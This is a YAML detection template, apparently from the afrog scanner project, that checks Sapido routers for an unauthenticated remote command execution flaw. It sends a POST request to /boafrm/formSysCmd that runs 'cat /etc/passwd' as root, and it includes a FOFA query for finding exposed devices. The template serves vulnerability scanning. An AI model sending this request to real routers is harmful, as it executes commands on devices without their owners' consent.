# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - body: |
      sysCmd=cat+%2Fetc%2Fpasswd&apply=Apply&submit-url=%2Fsyscmd.htm&msg=
    matchers:
      - type: status
        status:
          - 302
      - type: word
        part: body
        words:
          - <H1>302 Redirect</H1>
        condition: and
      - type: word
        part: header
        words:
          - /syscmd.htm
        condition: and
    method: POST
    path:
      - '{{BaseURL}}/boafrm/formSysCmd'
id: sapido-router-rce
info:
  author: zan8in
  description: |
    Sapido多款路由器在未授权的情况下，导致任意访问者可以以Root权限执行命令
    http://xxx.xxx.xxx.xxx/syscmd.asp
    http://xxx.xxx.xxx.xxx/syscmd.htm
    fofa: app="Sapido-路由器"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: Sapido 多款路由器 远程命令执行漏洞
  severity: critical
  tags: sapido,router,rce,argus-import
